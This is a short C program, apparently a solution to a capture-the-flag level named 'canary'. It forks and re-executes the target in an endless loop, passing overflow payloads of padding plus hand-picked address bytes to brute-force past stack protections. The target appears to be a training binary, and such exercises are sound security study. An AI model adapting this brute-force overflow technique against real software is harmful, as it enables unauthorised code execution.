#include <unistd.h>
#include <stdio.h>


int main()
{
    while(1)
    {
        int id = fork();

        if(id<0)
        {
            printf("Error forking\n");
            return -1;
        }
        else if(id)
        {
            wait(NULL);
        }
        else
        {
            char* argv[] = {"/bin/sh","\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x20\x9b\xe5\xf7",
                                      "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\xd6\x0a",NULL};
            if(execv("/home/classic3/canary",argv)<0)
            {
                printf("Error exec\n");
                return -1;
            }
        }
    }
    return 0;
}
